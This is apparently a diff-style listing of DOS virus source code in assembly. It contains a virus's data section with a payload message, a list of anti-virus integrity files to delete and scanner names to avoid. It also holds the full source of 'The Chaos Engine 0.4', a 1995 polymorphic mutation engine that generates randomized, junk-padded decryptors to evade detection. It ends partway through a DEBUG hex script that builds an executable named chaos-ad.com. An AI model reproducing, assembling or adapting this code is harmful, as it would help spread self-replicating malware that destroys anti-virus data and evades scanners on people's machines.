+msg2:   db      '-=> LIVING-IN-A-DYING-AGE-PERSECUTE-THE-HUMAN-RACE <=-',0
+
+
+
+word1:  db      'REFUSE  ',7
+
+        db      'RESIST  ',7
+
+        db      'RELOVE  ',7
+
+        db      'REMATE  ',7
+
+        db      'SUFFER  ',7
+
+        db      'REHATE  ',7
+
+        db      'REJECT  ',7
+
+        db      'PROGRESS',7
+
+        db      'PROCESS ',7
+
+        db      'PROTEST ',7
+
+        db      'NO REST ',7
+
+word2:
+
+
+
+files_to_kill:          db      'CHKLIST.MS',0,0,0
+
+                        db      'CHKLIST.CPS',0,0
+
+                        db      'ANTI-VIR.DAT',0
+
+
+
+evil_names:             db      'CO','F-','AV','-V','TB','VI','00','VB' 
+no_s_s:                 db      'CH','SC','DE','ND','SP','PR' 
+no_f_s:                 db      'AR','PK','RA','UC','LH','ZI','UU','IV' 
+
+
+generation              dw      0
+
+
+
+is_exe                  db      0
+
+
+
+keys_pressed            db      0
+
+
+
+                        db      0b8
+
+jmp_buffer              dw      0
+
+                        jmp     ax
+
+
+
+save_size_buf           dw      0CA05   ;CHAOS
+
+orig_size_low           dw      0
+
+orig_size_hi            dw      0
+
+
+
+fcb_name:
+
+first_2                 dw      20cd
+
+exe_last_page_bytes     dw      0
+
+exe_total_pages         dw      0
+
+                        dw      0
+
+exe_header_paras        dw      0
+
+exe_min_mem_paras       dw      0
+
+exe_max_mem_paras       dw      0
+
+exe_ss                  dw      0
+
+exe_sp                  dw      0
+
+s_s_buf                 dw      0
+
+exe_ip                  dw      0
+
+exe_cs                  dw      0
+
+exe_first_reloc_item    dw      0
+
+exe_overlay_num         dw      0
+
+
+
+include                 tce.asm
+
+
+
+end:
+
+
+
+==================================================================
+============= 
+                        þ          þ
+
+
+
+        radix   16
+
+
+
+;*****************************************
+
+;* T.H.E - C.H.A.O.S - E.N.G.I.N.E - 0.4 *
+
+;*****************************************
+
+;1995 - Sepultura - Australia
+
+;;
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
+;;;on CALLing of TCE -
+
+;;;AX = TCE Flags:1 - Pad To DECRYPTOR_LENGTH.
+
+;;;               2 - Make Short Decryptor (No Junk).
+
+;;;               4 - Add Segment Overide.
+
+;;;
+
+;;;CX = Length of Code to Encrypt.
+
+;;;DX = Delta Offset.
+
+;;;DS:SI = Code to encrypt (DS _MUST_ = CS).
+
+;;;ES:DI = Location of Buffer to Create Decryptor in.
+
+;;;
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
+;;;ON RETURN:
+
+;;;ES = DS = Segment of Decryptor / Encrypted Code
+
+;;;DX = Pointer to Start of Code
+
+;;;CX = Length of Code
+
+;;;;;;;;;;;;;;;;;;;
+
+;;;Flag EQUates
+
+
+
+MAKE_SMALL      equ     1
+
+PAD_TO_MAX      equ     2
+
+ADD_SEG         equ     4
+
+
+
+;;;;;;;;;;;;;;;;;;;
+
+;;;W.H.A.T.E.V.E.R
+
+
+
+DECRYPTOR_LENGTH        equ     190h
+
+MAX_PADDING             equ     90h - 1f
+
+length_1                equ     (offset int_tbl - offset one_byters)-1 
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;;;REGISTER TABLE - INTEL STANDLE FORMAT
+
+
+
+tce_AX                   equ    0000xB
+
+tce_CX                   equ    0001xB
+
+tce_DX                   equ    0010xB
+
+tce_BX                   equ    0011xB
+
+tce_SP                   equ    0100xB
+
+tce_BP                   equ    0101xB
+
+tce_SI                   equ    0110xB
+
+tce_DI                   equ    0111xB
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+;;;THe BeLoW InSTuCTiOn CaN KilL A MaN
+
+
+
+db      '[TCE-0.4]',0
+
+
+
+;*****************************************************
+
+;*****************************************************
+
+;*** The REAL _REAL_ START of THE CHAOS ENGINE 0.4 ***
+
+;*****************************************************
+
+;*****************************************************
+
+
+
+tce:    push    ax,bx,bp
+
+        push    di,si
+
+
+
+        cld
+
+
+
+        mov     tce_begin,di
+
+        mov     tce_delta,dx
+
+        mov     c_length,cx
+
+        mov     tce_flags,ax
+
+        call    clear_regs
+
+        mov     B index_sub,0
+
+
+
+        mov     B[offset more_junk],0b0
+
+        test    W tce_flags,MAKE_SMALL
+
+        if nz   mov B[offset more_junk],0c3
+
+
+
+        push    si
+
+        call    get_rand_1f
+
+        add     ax,MAX_PADDING
+
+        xchg    cx,ax
+
+        call    more_junk
+
+
+
+swap0:  mov     si,offset init_1
+
+        lodsw
+
+        call    binary
+
+        jz      no_swap1
+
+        xchg    ax,[si]
+
+        mov     [si-2],ax
+
+
+
+no_swap1:
+
+        push    ax
+
+        lodsw
+
+        call    binary
+
+        jnz     no_swap2
+
+        xchg    ax,[si]
+
+        mov     [si-2],ax
+
+
+
+no_swap2:
+
+        push    ax
+
+        lodsw
+
+        lodsw
+
+        call    binary
+
+        jz      build_code
+
+        xchg    ax,[si]
+
+        mov     [si-2],ax
+
+
+
+build_code:
+
+        pop     ax
+
+        call    ax
+
+        call    pad_10
+
+        pop     ax
+
+        call    ax
+
+        call    pad_10
+
+        call    W init_3
+
+        call    pad_10
+
+        call    gen_decrypt
+
+        call    pad_8
+
+        call    W init_4
+
+        call    pad_8
+
+        call    W init_5
+
+        call    pad_10
+
+        call    gen_loop
+
+        call    pad_8
+
+
+
+        test    W tce_flags,PAD_TO_MAX
+
+        jz      no_padding
+
+
+
+        mov     B[offset more_junk],0b0
+
+        mov     cx,DECRYPTOR_LENGTH
+
+        add     cx,tce_begin
+
+        sub     cx,di
+
+        call    more_junk
+
+
+
+no_padding:
+
+        mov     ax,di
+
+        sub     ax,DECRYPTOR_LENGTH
+
+        add     enc_index,ax
+
+        mov     bx,W index_loc
+
+        cmp     B index_sub,1
+
+        if e    neg ax
+
+        add     es:[bx],ax
+
+
+
+        pop     si
+
+        mov     cx,c_length
+
+        rep     movsb
+
+        mov     dx,tce_begin
+
+        mov     ds,es
+
+        call    encryptor
+
+        mov     cx,di
+
+        sub     cx,dx
+
+
+
+        pop     si,di
+
+        pop     bp,bx,ax
+
+        ret
+
+
+
+init_count:                     ;Initialises Count Register.. 
+        call    get_unused_reg  ;Make Count Initialiser in Encryptor and 
+        cmp     al,tce_DX
+
+        je      init_count
+
+        mov     count_reg,al    ;Decryptor
+
+        mov     bx,W c_length
+
+        shr     bx,1
+
+        mov     W enc_length,bx
+
+        call    gen_mov_reg
+
+        ret
+
+
+
+init_index:                     ;Initialises Index Register.. 
+        mov     ax,0ff          ;Makes Index Initialiser in Encryptor and 
+        call    get_rand        ;Decryptor..
+
+        push    ax
+
+        call    get_rand_7
+
+        pop     ax
+
+        if z    xor ax,ax
+
+        mov     B index_off,al
+
+        mov     bx,DECRYPTOR_LENGTH
+
+        add     bx, tce_begin
+
+        mov     W enc_index,bx
+
+        add     bx, tce_delta
+
+        cbw
+
+        sub     bx,ax
+
+
+
+get_index:
+
+        call    get_unused_reg
+
+        cmp     al,tce_BX
+
+        jb      get_index
+
+        mov     W index_num,ax
+
+        mov     B index_reg,al
+
+        mov     B index_set,1
+
+        call    gen_mov_reg
+
+        mov     B index_set,0
+
+        ret
+
+
+
+gen_decrypt:                    ;generates DECRYPTOR / ENCRYPTOR instruction 
+        mov     W loop_start,di
+
+        call    pad_8
+
+        mov     bl,B key_reg
+
+        sal     bl,3
+
+        call    get_rand_2
+
+        add     ax,ax
+
+        add     ax,offset enc_table
+
+        xchg    si,ax
+
+        lodsw
+
+        call    binary
+
+        if z    xchg ah,al
+
+        push    ax
+
+        cmp     si,offset enc_table + 2
+
+        jne     no_carry_set
+
+        mov     al,0f8
+
+        call    binary
+
+        if z    inc ax
+
+        mov     B enc_cf,al
+
+        stosb
+
+
+
+no_carry_set:
+
+        test    W tce_flags,ADD_SEG
+
+        jz      no_seg_set
+
+        mov     al,2e
+
+        stosb
+
+
+
+no_seg_set:
+
+        pop     ax
+
+        stosb
+
+        mov     B enc_loop,ah
+
+        mov     si,W index_num
+
+
+
+        cmp     B index_reg,tce_BP
+
+        je      encryptor_has_offset
+
+        cmp     B index_off,0
+
+        jne     encryptor_has_offset
+
+        push    ax
+
+        call    get_rand_7
+
+        pop     ax
+
+        jz      encryptor_has_offset
+
+        add     si,index_tab_c
+
+        lodsb
+
+        or      al,bl
+
+        stosb
+
+        ret
+
+
+
+encryptor_has_offset:
+
+        add     si,index_tab_b
+
+        lodsb
+
+        or      al,bl
+
+        mov     ah,B index_off
+
+        or      al,bl
+
+        stosw
+
+        xchg    al,ah
+
+        cbw
+
+        call binary
+
+        jnz     ret
+
+        mov     al,ah
+
+        stosb
+
+        add     es:B[di-3],40
+
+        ret
+
+
+
+modify_key:                     ;Modify Key: XOR/ADD/SUB key_reg,xxxx 
+        call    get_rand_7
+
+        jz      no_mod_key
+
+        call    get_rand_2
+
+        add     ax,offset modify_table
+
+        xchg    si,ax
+
+        lodsb
+
+        mov     ah,al
+
+        mov     al,81
+
+        mov     W enc_mod_op,ax
+
+        or      ah,B key_reg
+
+        stosw
+
+        call    get_any_rand
+
+        stosw
+
+
+
+no_mod_key:
+
+        mov     W enc_mod_val,ax
+
+
+
+        ret
+
+
+
+inc_index:                      ;increase index by 2..
+
+        call    binary          ;1 in 2 chance of ADD reg,2/SUB reg,-2 
+        jz      add_sub_index
+
+
+
+        mov     al,B index_reg
+
+        or      al,40
+
+        stosb
+
+        call    pad_8
+
+        stosb
+
+        ret
+
+
+
+add_sub_index:
+
+        mov     al,83
+
+        stosb
+
+        mov     ah,2
+
+        mov     al,B index_reg
+
+        or      al,0c0
+
+
+
+        call    binary
+
+        jnz     put_add_sub_index
+
+
+
+        neg     ah
+
+        or      al,0e8
+
+
+
+put_add_sub_index:
+
+        stosw
+
+        ret
+
+
+
+gen_loop:
+
+        mov     al,B count_reg
+
+        cmp     al,tce_CX
+
+        jne     not_CX
+
+
+
+        push    ax
+
+        call    get_rand_7
+
+        pop     ax
+
+        jz      not_CX
+
+
+
+        lea     bx,[di+2]
+
+        mov     ax,W loop_start
+
+        sub     ax,bx
+
+        mov     ah,0e2
+
+        call    binary
+
+        jnz     no_loop_nz
+
+        xchg    bp,ax
+
+        jmp     short do_loop_nz
+
+
+
+no_loop_nz:
+
+        xchg    ah,al
+
+        stosw
+
+        ret
+
+
+
+not_CX: xchg    bx,ax
+
+
+
+        call    binary
+
+        jz      count_add_sub
+
+
+
+        mov     al,48
+
+        or      al,bl
+
+        stosb
+
+        jmp     short zero_test
+
+
+
+
+
+count_add_sub:
+
+        mov     al,83
+
+        stosb
+
+        mov     ah,-1
+
+        mov     al,bl
+
+        or      al,0c0
+
+
+
+        call    binary
+
+        jnz     put_add_sub_count
+
+
+
+        neg     ah
+
+        or      al,0e8
+
+
+
+put_add_sub_count:
+
+        stosw
+
+        xor     bp,bp
+
+        push    ax
+
+        call    get_rand_7
+
+        pop     ax
+
+        jz      nloop_nz
+
+
+
+zero_test:
+
+        call    pad_10
+
+        xor     bp,bp
+
+do_loop_nz:
+
+        mov     al,B count_reg
+
+        mov     bl,al
+
+        sal     al,3
+
+        or      al,bl
+
+        xchg    ah,al
+
+        mov     bh,ah
+
+        call    get_rand_2
+
+        add     ax,offset zero_test_a
+
+        xchg    si,ax
+
+        lodsb
+
+        mov     ah,bh
+
+        or      ah,0c0
+
+        stosw
+
+
+
+nloop_nz:
+
+        lea     bx,[di+2]
+
+        mov     ax,W loop_start
+
+        sub     ax,bx
+
+        or      bp,bp
+
+        jnz     loop_nz
+
+        mov     ah,075
+
+        call    binary
+
+        jnz     nnnn
+
+        mov     B es:[di],0f8
+
+        inc     di
+
+        sub     ax,0fe01
+
+        db      0a9
+
+
+
+loop_nz:mov     ah,0e0
+
+
+
+nnnn:   xchg    ah,al
+
+        stosw
+
+        ret
+
+
+
+init_key:
+
+        call    get_any_rand
+
+        mov     W enc_key,ax
+
+        xchg    bx,ax
+
+        call    get_unused_reg
+
+        mov     B key_reg,al
+
+
+
+gen_mov_reg:
+
+        call    binary
+
+        jz      lea_mov
+
+
+
+        or      al,0b8
+
+        stosb
+
+        xchg    ax,bx
+
+        jmp     short put_mov_b
+
+
+
+lea_mov:call    binary
+
+        jz      zero_then_add
+
+
+
+        sal     al,3
+
+        or      al,06
+
+        mov     ah,8d
+
+        xchg    ah,al
+
+        stosw
+
+        xchg    ax,bx
+
+        jmp     short put_mov_b
+
+
+
+zero_then_add:          ;Zero Register (XOR/SUB reg,reg)
+
+        push    bx      ;Then OR/XOR/ADD Value
+
+        push    ax      ;or SUB -Value
+
+        mov     ah,0c0
+
+        or      ah,al
+
+        sal     al,3
+
+        or      ah,al
+
+        mov     al,29
+
+        call    binary
+
+        if z    mov al,31
+
+        stosw
+
+        call    pad_10
+
+        pop     bx
+
+        call    get_rand_2
+
+        add     ax,offset value_from_0
+
+        xchg    si,ax
+
+        lodsb
+
+        call    binary
+
+        jz      zero_then_sub
+
+
+
+        or      al,bl
+
+        mov     ah,81
+
+        xchg    ah,al
+
+        stosw
+
+        pop     ax
+
+
+
+put_mov_b:
+
+        cmp    B index_set,01
+
+        if e   mov W index_loc,di
+
+        stosw
+
+        ret
+
+
+
+zero_then_sub:
+
+        cmp     B index_set,01
+
+        if e    mov     B index_sub,1
+
+        mov     al,0e8
+
+        or      al,bl
+
+        mov     ah,81
+
+        xchg    ah,al
+
+        stosw
+
+        pop     ax
+
+        neg     ax
+
+        jmp     short put_mov_b
+
+
+
+pad_8:  push    ax              ;Sub Procedure to Pad Between 1 and 8 bytes 
+        call    get_rand_7
+
+        inc     ax
+
+        jmp     short padder
+
+
+
+pad_10: push    ax
+
+        call    get_rand_1f     ;Sub Procedure to Pad Between 8 and 16 bytes 
+        or      al,8
+
+padder: xchg    cx,ax
+
+        call    more_junk
+
+        pop     ax
+
+        ret
+
+
+
+more_junk:
+
+        mov     al,03
+
+        call    get_rand_b
+
+        jnz     mj0
+
+
+
+        mov     B [offset code_jmp],083 ;Re-Enable Jumps
+
+        mov     ax,cx                   ;else normal filler junk (1 in 16) 
+        cmp     ax,40
+
+        if a    mov al,40
+
+        call    get_rand_b
+
+        xchg    bx,ax
+
+        call    fill_jnk
+
+        jmp     short mj2
+
+
+
+mj0:                                    ;8 in 16 chance of some type of jump 
+        call    code_jmp
+
+
+
+
+
+mj2:    jcxz    ret
+
+        jmp     short more_junk
+
+
+
+
+
+one_byte:                       ;GENERATES A ONE BYTE JUNK INSTRUCTION 
+        jcxz    ret
+
+        mov     si,one_byters   ;FROM one_byters TABLE
+
+        mov     al,length_1
+
+        call    get_rand_b
+
+        add     si,ax
+
+        movsb
+
+        dec     cx
+
+        dec     bx
+
+        ret
+
+
+
+reg_op: call    get_rand_7      ;ANY OP unused_reg16,reg16.. 
+        sal     al,3
+
+        or      al,3
+
+        xchg    dx,ax
+
+        call    get_unused_reg
+
+        sal     al,3
+
+        mov     dh,al
+
+        call    get_rand_7
+
+do_op:  or      dh,al
+
+        or      dh,0c0
+
+        xchg    dx,ax
+
+put_2:  cmp     bx,2
+
+        jb      one_byte
+
+        stosw
+
+        dec     cx,2
+
+        dec     bx,2
+
+        ret
+
+
+
+
+
+lea_reg:call    get_rand_7      ;LEA unused_reg,[BP/BX/SI/DI] 
+        cmp     al,6
+
+        je      lea_reg
+
+
+
+        xchg    dx,ax
+
+        call    get_unused_reg
+
+        sal     al,3
+
+        or      al,dl
+
+        mov     ah,08d
+
+        xchg    ah,al
+
+
+
+        jmp     short put_2
+
+
+
+op_ax:  call    get_any_rand
+
+        and     al,8
+
+        or      al,5
+
+        and     ah,3
+
+        shr     ah,4
+
+        or      al,ah
+
+
+
+put_3:  cmp     bx,3
+
+        jb      reg_op
+
+        stosb
+
+        call    get_any_rand
+
+put_3b: stosw
+
+        sub     cx,3
+
+        sub     bx,3
+
+        ret
+
+
+
+mov_reg:call    get_unused_reg  ;MOV unused_reg16,xxxx
+
+        or      al,0b8
+
+        jmp     short put_3
+
+
+
+op_reg_im:                      ;cmp/add/sub/adc/sbb/or/xor/and reg16,imm16 
+        cmp     bx,4
+
+        jb      op_ax
+
+        call    get_unused_reg
+
+        mov     ah,81
+
+        xchg    dx,ax
+
+        call    get_rand_7
+
+        sal     al,3
+
+        or      ax,dx
+
+        xchg    ah,al
+
+        or      ah,0c0
+
+        stosw
+
+        call    get_any_rand
+
+        stosw
+
+        sub     bx,4
+
+        sub     cx,4
+
+        ret
+
+
+
+code_jmp:
+
+        cmp     cx,3
+
+        jb      ret
+
+
+
+        mov     B [offset code_jmp],0c3 ;Disable Jumps.This ensures Unchained 
+                                        ;(TBAV-J) and helps stops heuristics 
+        call    get_any_rand            ;else conditional jmp 
+        and     ax,1f0f                 ;between 4 and 43 bytse jmp length 
+        add     ah,4
+
+        or      al,70                   ;conditional jmp instructions are 70 
+                                        ;--> 7f
+
+        push    ax
+
+        call    get_rand_1f
+
+        pop     ax
+
+        if z    mov al,0e3
+
+        xor     bx,bx
+
+        mov     bl,ah
+
+
+
+        dec     cx,2
+
+        cmp     bx,cx
+
+        jb      put_jmp
+
+        mov     bx,cx
+
+        mov     ah,bl
+
+
+
+put_jmp:stosw
+
+
+
+fill_jnk:
+
+        or      bx,bx
+
+        jz      ret
+
+
+
+        mov     al,((offset binary - offset junk_tbl)/2)-1 
+        call    get_rand_b
+
+        add     ax,ax
+
+        add     ax,offset junk_tbl
+
+        xchg    si,ax
+
+        lodsw
+
+        call    ax
+
+        jmp     short fill_jnk
+
+
+
+pp_reg:                  ;generate PUSH reg / junk / POP reg 
+        cmp     bx,3
+
+        jb      gen_int
+
+
+
+        lea     ax,[bx-2]
+
+        shr     ax,1
+
+        call    get_rand
+
+        xchg    ax,dx
+
+        call    get_rand_7
+
+        or      al,50
+
+        stosb
+
+        dec     cx
+
+        dec     bx
+
+        push    ax
+
+        xchg    dx,ax
+
+        sub     bx,ax
+
+        push    bx
+
+        xchg    bx,ax
+
+        call    fill_jnk
+
+        pop     bx
+
+        pop     ax
+
+
+
+        call    binary
+
+        jz      use_same
+
+        call    get_unused_reg
+
+        or      al,50
+
+
+
+use_same:
+
+        or      al,8
+
+        stosb
+
+        dec     cx
+
+        dec     bx
+
+        ret
+
+
+
+gen_int:cmp     bx,4
+
+        jb      ret
+
+
+
+        call    get_rand_2
+
+
+
+        add     ax,ax
+
+        add     ax,offset int_tbl
+
+        xchg    si,ax
+
+        lodsw
+
+        mov     dx,0cdb4
+
+        xchg    al,dl
+
+        stosw
+
+        xchg    dx,ax
+
+        xchg    ah,al
+
+        stosw
+
+        sub     cx,4
+
+        sub     bx,4
+
+        ret
+
+
+
+junk_tbl:       dw      offset  op_reg_im
+
+                dw      offset  op_reg_im
+
+                dw      offset  op_reg_im
+
+                dw      offset  gen_int
+
+                dw      offset  gen_int
+
+                dw      offset  pp_reg
+
+                dw      offset  pp_reg
+
+                dw      offset  reg_op
+
+                dw      offset  reg_op
+
+                dw      offset  lea_reg
+
+                dw      offset  lea_reg
+
+                dw      offset  mov_reg
+
+                dw      offset  op_ax
+
+                dw      offset  one_byte
+
+
+
+binary: push    ax
+
+        mov     al,1
+
+        call    get_rand_b
+
+        pop     ax
+
+        ret
+
+
+
+get_rand_2:
+
+        mov     al,2
+
+        db      0a9
+
+
+
+get_rand_7:
+
+        mov     al,7
+
+        db      0a9
+
+
+
+get_rand_1f:
+
+        mov     al,1f
+
+        db      0a9
+
+
+
+get_any_rand:                   ;return rnd number in AX between 0 and FFFE 
+        mov     al,0fe
+
+
+
+get_rand_b:
+
+        cbw
+
+
+
+get_rand:                       ;returns random number in AX between 0 and AX 
+        push    cx,dx
+
+        inc     ax
+
+        push    ax
+
+        in      ax,40
+
+        xchg    cx,ax
+
+        in      ax,40
+
+        rol     ax,cl
+
+        xchg    cx,ax
+
+        in      ax,40
+
+        xor     ax,cx
+
+        adc     ax,1234
+
+        org     $-2
+
+last_rand       dw      0AAAA
+
+        mov     last_rand,ax
+
+        pop     cx
+
+        xor     dx,dx
+
+        cmp     cx,1
+
+        adc     cx,0
+
+        div     cx
+
+        xchg    dx,ax
+
+        or      ax,ax
+
+        pop     dx,cx
+
+        ret
+
+
+
+one_byters:     cmc                     ;15 1 byte junk instructions 
+                cld
+
+                std
+
+                in      ax,dx
+
+                in      al,dx
+
+                lahf
+
+                cbw
+
+                nop
+
+                aaa
+
+                aas
+
+                daa
+
+                das
+
+                inc     ax
+
+                dec     ax
+
+                xlat
+
+
+
+
+
+int_tbl:        dw      0116    ;AH=01,INT16: Check Keyboard Buffer.. 
+                dw      0216    ;AH=02,INT16: Get Keyboard States.. 
+                dw      4d21    ;AH=4D,INT21: Get Program Terminate Status.. 
+                dw      4d21    ;AH=4D,INT21: Get Program Terminate Status.. 
+                dw      0d10    ;AH=0D,INT10: Get Video Info.. 
+                dw      0b21    ;AH=0B,INT21: Check Keyboard Buffer.. 
+                dw      002a
+
+                dw      002a
+
+
+
+
+
+clear_regs:     cwd
+
+                mov     B index_reg,dl      ;Clears Register Tables 
+                mov     B key_reg,dl        ;(All Regs Free).. 
+                mov     B count_reg,dl
+
+                ret
+
+
+
+get_unused_reg: call    get_rand_7      ;Return an Unused Register.. 
+                test    al,NOT tce_SP   ;But _NOT_ SP, or AX. 
+                jz      get_unused_reg
+
+                cmp     al,index_reg
+
+                je      get_unused_reg
+
+                cmp     al,count_reg
+
+                je      get_unused_reg
+
+                cmp     al,B key_reg
+
+                je      get_unused_reg
+
+                ret
+
+
+
+;**********************************************
+
+;* The Encryptor (Built along with Decryptor) *
+
+;**********************************************
+
+encryptor:      mov     cx,1234
+
+                org     $-2
+
+enc_length      dw      0
+
+
+
+                mov     bx,1234
+
+                org     $-2
+
+enc_index       dw      0
+
+
+
+                mov     ax,1234
+
+                org     $-2
+
+enc_key         dw      0
+
+
+
+enc_cf:         nop
+
+enc_loop:       xor     [bx],ax
+
+
+
+enc_mod_op      dw      0
+
+enc_mod_val     dw      0
+
+
+
+                inc     bx,2
+
+                loop    enc_cf
+
+                ret
+
+
+
+;****************************
+
+;* Data / Variables / Flags *
+
+;****************************
+
+
+
+init_1  dw      offset init_count
+
+init_2  dw      offset init_key
+
+init_3  dw      offset init_index
+
+
+
+init_4  dw      offset inc_index
+
+init_5  dw      offset modify_key
+
+
+
+;* The Below is A table of Values to Be Used To Choose *
+
+;* The Count Register, The Index Register, and The Reg *
+
+;* to   save  SP   in   During   the  Decryptor   Loop *
+
+;                             BX   BP SI DI     ;This Table is used To Build 
+index_tab_b:    db      0,0,0,47,0,46,44,45     ;The Decryptor Instruction 
+index_tab_c:    db      0,0,0,7,0,0,4,5         ;Same As Above 
+;                       SBB ADC XOR XOR ADD SUB
+
+enc_table:      db      19, 11, 31, 31, 01, 29  ;The Decryptor Opcodes.. 
+
+
+;                       AND OR TEST
+
+zero_test_a:    db      21, 09,85
+
+
+
+;                       SUB                     ;Opcodes to Modify the Key 
+modify_table:   db      0e8                     ;Register
+
+;                       ADD XOR OR              ;Opcode to get A value 
+value_from_0:   db      0c0,0f0,0c8             ;from 0.
+
+
+
+loop_start      dw      0       ;Postion for LOOP to Jump to.. 
+
+
+index_num       dw      0
+
+index_off       db      0       ;OFFSET of INDEX reference (i.e: [SI+XX]). 
+index_loc       dw      0       ;location in ES of index reference set 
+index_sub       db      0       ;Was index_reg set using 0 the sub -value? 
+
+
+index_reg       db      0       ;Table of Used Registers.. 
+count_reg       db      0       ;used in GET_UNUSED_REG
+
+key_reg         db      0
+
+index_set       db      0
+
+
+
+tce_flags       dw      0       ;Engines Flags
+
+tce_delta       dw      0       ;Delta Offset
+
+tce_begin       dw      0       ;Beginning
+
+c_length        dw      0
+
+end_tce:
+
+
+
+==================================================================
+============== 
+N chaos-ad.com
+
+E  100  FB FC 1E E8 DE 00 74 09 B1 C1 B8 01 00 D3 E0 85
+
+E  110  C0 75 03 E9 86 00 E8 5E 04 B8 00 58 CD 21 50 B8
+
+E  120  01 58 50 BB 82 00 CD 21 B8 02 58 CD 21 B4 00 50
+
+E  130  B8 03 58 50 B3 01 CD 21 B4 48 BB D3 00 CD 21 50
+
+E  140  48 8E D8 C7 06 01 00 08 00 07 58 5B CD 21 58 5B
+
+E  150  CD 21 0E 1F B9 2F 0D 56 E8 56 05 5E 06 1F 8E C1
+
+E  160  BF B0 04 8C 1E 09 01 56 BE F6 00 B9 16 00 E8 40
+
+E  170  05 5E BB 21 00 89 DF E8 69 04 89 1E 3A 01 8C 06
+
+E  180  3C 01 B8 B0 04 99 E8 72 04 FF 06 A2 07 83 26 A2
+
+E  190  07 3F 75 03 E8 34 05 B8 00 4B CD 21 81 FC FE 0F
+
+E  1a0  74 15 1F BF 00 01 57 81 C6 B1 07 0E 07 B9 05 00
+
+E  1b0  E8 FE 04 E8 71 04 C3 58 8E C0 05 10 00 0E 1F 95
+
+E  1c0  03 84 DC 00 FA 8E D0 8B A4 DE 00 FB 95 03 84 E2
+
+E  1d0  00 50 FF B4 E0 00 06 1F E8 4C 04 CB 00 00 00 00
+
+E  1e0  00 00 00 00 33 FF 8E DF 89 E5 8B 76 00 83 EE 06
+
+E  1f0  80 3E B0 04 9C C3 9C 50 33 C0 50 58 4C 4C 58 0B
+
+E  200  C0 58 74 02 9D CF EA 0B 01 00 00 50 86 C4 3D 4B
+
+E  210  00 74 46 3C 43 74 42 3C 3E 74 26 3C 6C 74 42 3C
+
+E  220  3D 74 42 3C 4B 74 3E 3C 11 74 4A 3C 12 74 46 3C
+
+E  230  4E 74 0B 3C 4F 74 07 58 9D EA 00 00 00 00 E9 D0
+
+E  240  02 58 9D 60 06 1E E8 4B 04 72 05 E8 0D 01 EB 03
+
+E  250  E8 73 03 1F 07 61 CA 02 00 60 06 1E E8 F6 00 EB
+
+E  260  0F 60 89 F2 A8 60 06 1E E8 29 04 72 EF E8 73 00
+
+E  270  1F 07 61 EB C2 58 0E E8 BF FF 9C 60 1E 06 0A C0
+
+E  280  75 51 E8 FA 03 72 4C B0 2F E8 42 03 06 1F 80 3F
+
+E  290  FF 75 03 83 C3 07 8D 77 01 0E 07 BF B1 07 FC B9
+
+E  2a0  08 00 E8 35 00 B0 2E AA 4E 01 CE B9 03 00 E8 29
+
+E  2b0  00 B0 00 AA BA B1 07 89 DF 80 7F 1D AD 75 14 E8
+
+E  2c0  6F 03 1E 07 0E 1F E8 F3 02 72 05 AF AE E9 6F 02
+
+E  2d0  E8 1A 03 07 1F 61 9D CA 02 00 AC 3C 20 74 03 AA
+
+E  2e0  E2 F8 C3 E8 D6 02 73 01 C3 93 0E 1F FC E8 41 03
+
+E  2f0  E8 15 03 E8 26 03 B9 FF FF BA FA FF B8 42 02 E8
+
+E  300  CC 02 3C A7 75 48 B9 06 00 BA C3 07 E8 BD 02 72
+
+E  310  3D 81 3E C3 07 05 CA 75 35 FF 36 C7 07 FF 36 C5
+
+E  320  07 B9 FF FF BA DE FF B8 42 02 E8 A1 02 BA B1 07
+
+E  330  B9 1C 00 51 52 E8 94 02 E8 9F 02 5A 59 E8 89 02
+
+E  340  5A 59 B8 42 00 E8 86 02 B9 00 00 E8 7B 02 E8 70
+
+E  350  02 E8 99 02 C3 E8 64 02 72 FA 93 0E 1F FC E8 D0
+
+E  360  02 E8 A4 02 26 81 7D 29 4F 4D 74 08 26 81 7D 29
+
+E  370  58 45 75 11 26 8B 55 20 B9 08 00 BE 76 07 AD 39
+
+E  380  D0 E0 FB 75 03 E9 82 01 E8 91 02 E8 4C 02 B9 1C
+
+E  390  00 BA B1 07 E8 35 02 72 EC E8 3B 02 3C AD 75 03
+
+E  3a0  E9 67 01 C6 06 A4 07 01 8B 0E B1 07 32 CD 80 F9
+
+E  3b0  17 74 10 C6 06 A4 07 00 0B D2 75 C9 3D 40 F0 77
+
+E  3c0  C4 EB 20 60 06 1E 07 BE BF 07 BF DC 00 FC A5 A5
+
+E  3d0  AD A5 A5 07 61 83 FA 0E 77 AB 0B D2 75 05 3D 88
+
+E  3e0  13 72 A2 89 16 AF 07 A3 AD 07 05 00 01 A3 A7 07
+
+E  3f0  E4 40 24 07 3C 04 74 F8 BE A6 07 80 24 F8 80 64
+
+E  400  04 F8 08 04 08 44 04 60 1E 06 0E 1F 33 FF 33 F6
+
+E  410  B9 2F 0D 68 00 BE 07 26 81 3D 20 07 74 03 F9 EB
+
+E  420  23 8B 16 A7 07 33 C0 80 3E A4 07 01 75 06 B8 04
+
+E  430  00 83 E2 0F E8 A0 04 E8 8F 01 9C B9 97 06 B8 20
+
+E  440  07 F3 AB 9D 07 1F 61 73 03 E9 BE 00 E8 88 01 89
+
+E  450  C1 B0 8B 3B C1 80 D4 00 83 D2 00 92 91 B8 42 00
+
+E  460  E8 6B 01 50 B9 1C 00 BA B1 07 E8 5C 01 B9 06 00
+
+E  470  BA AB 07 E8 53 01 58 80 3E A4 07 01 74 11 E8 59
+
+E  480  01 0E 1F BA A6 07 B9 05 00 E8 3D 01 E9 7B 00 83
+
+E  490  3E C9 07 40 74 07 83 3E CB 07 00 74 03 E9 6A 00
+
+E  4a0  83 3E BD 07 FF 75 F6 8B 36 AF 07 8B 0E AD 07 A1
+
+E  4b0  B5 07 B9 00 02 F7 E1 3B D6 72 E2 3B C1 72 DE A1
+
+E  4c0  AD 07 8B 16 AF 07 B9 10 00 F7 F1 2B 06 B9 07 A3
+
+E  4d0  C7 07 89 16 C5 07 05 20 00 A3 BF 07 C7 06 C1 07
+
+E  4e0  00 10 05 1A 00 39 06 BB 07 7F 03 A3 BB 07 E8 E6
+
